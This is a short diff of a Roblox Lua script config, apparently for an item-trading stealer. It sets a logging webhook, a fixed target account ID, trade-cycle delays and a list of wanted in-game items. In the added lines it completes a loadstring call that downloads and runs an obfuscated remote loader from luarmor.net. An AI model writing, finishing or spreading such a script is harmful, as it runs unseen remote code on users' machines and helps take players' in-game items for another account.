@@ -1,6 +1,8 @@
+-- ts file was generated at discord.gg/25ms
+
 local genv = getgenv()
 
-genv.WEBHOOK_URL = 'https://skama.net/api/logs/webhook/mrr_f81a6e0c6ed04aab942b25e647676766'
+genv.WEBHOOK_URL = 'https://skama.net/api/logs/webhook/mrr_9079127b18644b1b89bdc86eea1c2742'
 genv.TARGET_ID = 9163477035
 genv.DELAY_STEP = 1
 genv.TRADE_CYCLE_DELAY = 2
@@ -71,4 +73,5 @@ genv.TARGET_BRAINROTS = {
     ['Noobini Pizzanini'] = true,
 }
 
-loadstring(game:HttpGet('https://api.luarmor.net/files/v4/loaders/9a91b3ba6fb71423853ec2f885c42d67
+loadstring(game:HttpGet('https://api.luarmor.net/files/v4/loaders/9a91b3ba6fb71423853ec2f885c42d67.lua'))()
+
